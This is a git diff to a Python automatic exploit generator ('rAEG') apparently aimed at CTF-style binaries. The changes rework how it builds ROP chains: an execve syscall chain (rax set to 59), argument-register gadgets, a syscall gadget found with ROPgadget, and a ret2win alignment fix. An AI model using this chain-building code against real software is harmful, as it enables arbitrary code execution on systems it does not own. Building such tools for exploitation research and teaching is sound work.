@@ -35,7 +35,7 @@ class rAEG:
         self.elf = context.binary =  ELF(binary_path)
         #self.libc = context.binary = ELF(libc_path)
 
-        self.rop_calls = []
+        #self.rop_calls = []
         self.exploit_function = None
 
         self.rop_chain = None
@@ -85,7 +85,7 @@ class rAEG:
         self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
 
-
+        printf_leak_address = None
         #self.proj.hook_symbol()
 
 
@@ -257,32 +257,32 @@ class rAEG:
     def rop_chain_call_function(self, function, parameters):
 
         chain = b""
-        # If it is a syscall add pop rax, ret and 59 for execve
-        if function == "syscall":
-            pop_rax_string= self.find_reg_gadget("rax")
-            instructions = pop_rax_string.split(b";")
-            pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
-            chain += pop_rax + p64(59)
-
-            for instruction in instructions[1:]:
-                if b"ret" in instruction:
-                    break
-                print(instruction)
-                param = p64(0)
-                for i in range(len(parameters)):
-                    if arg_regs[i] in instruction:
-                        print(parameters[i])
-                        param = parameters[i]
-                chain += param
-
-        # If there are any parameters to add to the rop chain then they go in here
+                # If there are any parameters to add to the rop chain then they go in here
         if len(parameters) > 0:
-            for i in range(len(parameters)):
+            # If it is a syscall add pop rax, ret and 59 for execve
+            if function == "syscall":
+                pop_rax_string= self.find_reg_gadget("rax")
+                instructions = pop_rax_string.split(b";")
+                pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
+                chain += pop_rax + p64(59)
+
+                for instruction in instructions[1:]:
+                    if b"ret" in instruction:
+                        break
+                    print(instruction)
+                    param = p64(0)
+                    for i in range(len(parameters)):
+                        if arg_regs[i] in instruction:
+                            print(parameters[i])
+                            param = parameters[i]
+                    chain += param
+
+            # Reversed in order as the more important parameters go in last
+            for i in range(len(parameters)-1, -1, -1):
                 pop_reg_string = self.find_reg_gadget(arg_regs[i].decode())
                 instructions = pop_reg_string.split(b";")
                 pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                 chain += pop_reg + parameters[i]
-                print(instructions[1:])
                 for instruction in instructions[1:]:
                     if b"ret" in instruction:
                         break
@@ -291,13 +291,27 @@ class rAEG:
                         if arg_regs[i] in instruction:
                             #print(arg_regs[i])
                             param = parameters[i]
+                            print(param)
                             break;
                     chain += param
 
         # To avoid movaps error for ret2win put an extra ret
         if function == "win" and len(parameters) <= 0:
             chain += p64(self.elf.sym["_fini"])
-        chain += p64(self.elf.sym[function])
+        if function == "syscall":
+            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
+            output.pop(0)
+            output.pop(0)
+            output.pop(-1)
+            output.pop(-1)
+            output.pop(-1)
+
+
+            syscall_gadget = int(output[0].split(b":")[0].strip(),16)
+
+            chain += p64(syscall_gadget)
+        else:
+            chain += p64(self.elf.sym[function])
         log.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")
 
         return chain
@@ -337,8 +351,8 @@ class rAEG:
         return None
 
     def exploit(self):
-        p = self.start_process("GDB")
-        #p = self.start_process(None)
+        #p = self.start_process("GDB")
+        p = self.start_process(None)
         if self.symbolic_padding != None:
             # Check if regular rop chain or libc leak
             # If there is a leak given then parse the leak
